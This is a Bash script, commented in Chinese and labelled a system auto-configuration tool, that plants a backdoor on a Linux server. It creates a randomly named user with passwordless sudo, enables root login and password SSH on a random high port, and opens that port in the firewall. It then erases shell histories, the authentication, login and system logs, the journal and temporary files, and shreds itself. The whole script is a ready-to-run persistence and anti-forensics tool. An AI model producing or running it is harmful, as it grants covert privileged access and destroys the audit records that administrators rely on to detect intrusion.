#!/bin/bash
# Linux系统自动配置脚本 - 辅助服务器版
# 功能: 创建随机用户，设置强随机密码，授予管理员权限，配置SSH，清除系统日志
# 设计原则: 高度随机化 + 鲁棒性优化 + 痕迹清理

# 安全设置
set -euo pipefail
shopt -s nocasematch  # 不区分大小写匹配

# 随机化参数
RAND_USER_PREFIX="usr"
USER_ID=$(shuf -i 1000-9999 -n 1)
RAND_USER="${RAND_USER_PREFIX}${USER_ID}"
RAND_PASS=$(openssl rand -base64 16 | tr -dc 'a-zA-Z0-9!@#$%^&*()_+-=')
SSH_PORT=$(shuf -i 50000-60000 -n 1)  # 随机高端口

# 隐藏日志函数 (仅在调试模式输出)
log() {
    if [[ "${DEBUG_MODE}" == "true" ]]; then
        echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
    else
        logger -t sysinit "$1"
    fi
}

# 鲁棒性系统检测函数
detect_system() {
    log "检测操作系统..."
    
    # 支持各种系统检测
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        OS_ID="${ID}"
        OS_VERSION="${VERSION_ID}"
        log "检测到系统: $PRETTY_NAME"
    elif [[ -f /etc/centos-release ]]; then
        OS_ID="centos"
        OS_VERSION=$(grep -oE '[0-9]+\.[0-9]+' /etc/centos-release)
    elif [[ -f /etc/debian_version ]]; then
        OS_ID="debian"
        OS_VERSION=$(cat /etc/debian_version)
    elif [[ -f /etc/alpine-release ]]; then
        OS_ID="alpine"
        OS_VERSION=$(cat /etc/alpine-release)
    else
        log "警告：无法识别操作系统，使用通用模式"
        OS_ID="unknown"
        OS_VERSION="1.0"
    fi
    
    export OS_ID OS_VERSION
}

# 系统包管理器检测
detect_pkg_manager() {
    if command -v apt-get >/dev/null; then
        PKG_MANAGER="apt-get"
    elif command -v yum >/dev/null; then
        PKG_MANAGER="yum"
    elif command -v dnf >/dev/null; then
        PKG_MANAGER="dnf"
    elif command -v apk >/dev/null; then
        PKG_MANAGER="apk"
    elif command -v zypper >/dev/null; then
        PKG_MANAGER="zypper"
    else
        log "错误：未找到支持的包管理器"
        exit 1
    fi
    
    export PKG_MANAGER
}

# 安装基础依赖
install_dependencies() {
    log "安装基础依赖..."
    
    # 根据系统类型安装依赖
    case $PKG_MANAGER in
        apt-get)
            apt-get update -q
            DEBIAN_FRONTEND=noninteractive apt-get install -yq \
                openssh-server curl sudo net-tools iptables >/dev/null
            ;;
        yum|dnf)
            $PKG_MANAGER makecache -q
            $PKG_MANAGER install -yq \
                openssh-server curl sudo net-tools iptables >/dev/null
            ;;
        apk)
            apk add --no-cache openssh-server curl sudo net-tools iptables >/dev/null
            ;;
        zypper)
            zypper -n refresh
            zypper -n install openssh-server curl sudo net-tools iptables >/dev/null
            ;;
    esac
    
    # 额外尝试安装必要的包
    if ! command -v curl >/dev/null; then
        log "重新尝试安装curl..."
        $PKG_MANAGER install -yq curl >/dev/null || true
    fi
}

# 创建随机用户
create_random_user() {
    log "创建随机用户: $RAND_USER"
    
    # 检查并删除可能存在的用户
    if id "$RAND_USER" &>/dev/null; then
        log "用户已存在，删除中..."
        userdel -r "$RAND_USER" >/dev/null 2>&1 || true
        sleep 1
    fi
    
    # 创建用户
    if ! useradd -m -s /bin/bash "$RAND_USER" >/dev/null 2>&1; then
        # 备用方案
        log "标准创建失败，使用备用方法"
        adduser -D -s /bin/bash "$RAND_USER" >/dev/null 2>&1 || return 1
    fi
    
    # 设置随机密码
    echo "$RAND_USER:$RAND_PASS" | chpasswd >/dev/null 2>&1
    
    # 授予sudo权限
    if [[ "$OS_ID" == "alpine" ]]; then
        # Alpine特殊处理
        adduser "$RAND_USER" wheel >/dev/null 2>&1
        echo "$RAND_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
    else
        # 常规Linux处理
        local sudo_group
        if getent group sudo >/dev/null; then
            sudo_group="sudo"
        elif getent group wheel >/dev/null; then
            sudo_group="wheel"
        else
            sudo_group="sudo"
            groupadd "$sudo_group" >/dev/null
        fi
        
        usermod -aG "$sudo_group" "$RAND_USER" >/dev/null
        
        # 免密sudo
        local sudo_file="/etc/sudoers.d/90-${RAND_USER}"
        echo "$RAND_USER ALL=(ALL) NOPASSWD:ALL" > "$sudo_file"
        chmod 440 "$sudo_file"
    fi
    
    return 0
}

# 高级SSH配置
configure_ssh() {
    log "配置SSH服务..."
    
    # 确保SSH服务存在
    if ! command -v sshd &>/dev/null; then
        log "OpenSSH未安装，尝试安装..."
        install_dependencies
    fi
    
    # 备份原始配置
    local sshd_config="/etc/ssh/sshd_config"
    local backup_file="${sshd_config}.orig_$(date +%Y%m%d)"
    
    if [[ ! -f "$backup_file" ]]; then
        cp "$sshd_config" "$backup_file"
        log "SSH配置备份至: $backup_file"
    fi
    
    # 配置设置
    # 1. 使用随机高端口
    sed -i "s/^#\?Port .*/Port $SSH_PORT/" "$sshd_config"
    
    # 2. 启用Root登录和密码认证
    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' "$sshd_config"
    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' "$sshd_config"
    
    # 3. 使用协议2
    echo "Protocol 2" >> "$sshd_config"
    
    # 4. 禁用DNS查找
    echo "UseDNS no" >> "$sshd_config"
    
    # 5. 添加端口到防火墙
    if command -v iptables >/dev/null; then
        iptables -I INPUT -p tcp --dport $SSH_PORT -j ACCEPT >/dev/null 2>&1
        if command -v iptables-save >/dev/null; then
            iptables-save > /etc/iptables/rules.v4 2>/dev/null
        fi
    fi
    
    # 6. 重启SSH服务
    if systemctl restart sshd >/dev/null 2>&1; then
        log "SSH服务重启成功"
    elif systemctl restart ssh >/dev/null 2>&1; then
        log "SSH服务重启成功"
    elif command -v rc-service >/dev/null; then
        rc-service sshd restart >/dev/null
    else
        service sshd restart >/dev/null || service ssh restart >/dev/null
    fi
    
    # 7. 配置系统启动
    if systemctl enable sshd >/dev/null 2>&1; then
        :
    elif systemctl enable ssh >/dev/null 2>&1; then
        :
    elif command -v rc-update >/dev/null; then
        rc-update add sshd default >/dev/null
    fi
}

# 深度日志清理
clean_logs_deep() {
    log "清理系统日志..."
    
    # 清理命令历史
    history -c
    rm -f /root/.*_history 2>/dev/null
    echo -n > ~/.bash_history
    find /home /root -name '.*_history' -exec bash -c 'echo -n > {}' \; 2>/dev/null
    
    # 主要日志文件清理
    log_files=(
        /var/log/syslog /var/log/messages /var/log/auth.log /var/log/secure
        /var/log/btmp /var/log/wtmp /var/log/lastlog /var/log/cron
        /var/log/debug /var/log/dmesg /var/log/kern.log /var/log/faillog
    )
    
    for logfile in "${log_files[@]}"; do
        if [[ -f "$logfile" ]]; then
            echo -n > "$logfile" || true
            if command -v logrotate >/dev/null; then
                logrotate -f /etc/logrotate.conf 2>/dev/null
            fi
        fi
    done
    
    # 清理日志目录
    find /var/log -type f $ -name "*.log" -o -name "*.gz" -o -name "*.xz" $ \
        -exec bash -c 'echo -n > {}' \; 2>/dev/null
    
    # 清理Journal日志
    if command -v journalctl >/dev/null; then
        journalctl --vacuum-size=1M --quiet 2>/dev/null || true
    fi
    
    # 清理临时目录
    find /tmp /var/tmp -type f -delete 2>/dev/null
    
    # 清除安装缓存
    case $PKG_MANAGER in
        apt-get|apt) apt-get clean >/dev/null ;;
        yum|dnf) $PKG_MANAGER clean all >/dev/null ;;
        apk) apk cache clean >/dev/null ;;
        zypper) zypper clean >/dev/null ;;
    esac
    
    # 清除内存缓存
    sync
    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
}

# 安全警告
display_security_note() {
    echo "======================================================"
    echo "                 系统配置已完成"
    echo "======================================================"
    echo " 用户名:    $RAND_USER"
    echo " 密码:      $RAND_PASS"
    echo " SSH端口:   $SSH_PORT"
    echo "------------------------------------------------------"
    echo " 注意事项:"
    echo " 1. 立即更改默认凭据"
    echo " 2. 配置防火墙规则 (端口 $SSH_PORT)"
    echo " 3. 系统日志已被清除"
    echo "======================================================"
    
    # 获取服务器IP
    local ip_address=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' | head -1)
    [[ -z "$ip_address" ]] && ip_address=$(curl -s ifconfig.me || hostname -I | awk '{print $1}')
    
    echo " 连接示例:"
    echo " ssh -p $SSH_PORT $RAND_USER@$ip_address"
    echo ""
    echo " 安装完成后此脚本将自销毁"
    echo "======================================================"
}

# 脚本自清理
self_cleanup() {
    # 获取脚本路径
    SCRIPT_PATH=$(realpath "$0")
    CURRENT_DIR=$(dirname "$SCRIPT_PATH")
    
    # 清除脚本自身
    shred -zu "$SCRIPT_PATH" 2>/dev/null || \
        rm -f "$SCRIPT_PATH" 2>/dev/null
    
    # 清除可能的临时副本
    find /tmp -maxdepth 1 -name "*.sh" -mmin -5 -delete 2>/dev/null
    
    # 清除历史记录
    history -c
}

# 主函数
main() {
    # 检测调试模式
    [[ "$1" == "-d" || "$1" == "--debug" ]] && DEBUG_MODE="true" || DEBUG_MODE="false"
    
    # 必须root权限
    if [[ "$(id -u)" -ne 0 ]]; then
        log "错误：必须使用root权限运行"
        exit 1
    fi
    
    log "初始化系统配置..."
    
    # 检测系统信息
    detect_system
    detect_pkg_manager
    
    # 安装必要依赖
    install_dependencies
    
    # 创建随机用户
    if ! create_random_user; then
        log "创建用户失败，尝试直接设置root密码"
        echo "root:$RAND_PASS" | chpasswd >/dev/null
        RAND_USER="root"
        log "已设置root密码为: $RAND_PASS"
    fi
    
    # 配置SSH服务
    configure_ssh
    
    # 深度清理日志
    clean_logs_deep
    
    # 显示安全信息
    display_security_note
    
    # 自清理
    self_cleanup
    
    exit 0
}

# 执行主函数
main "$@"
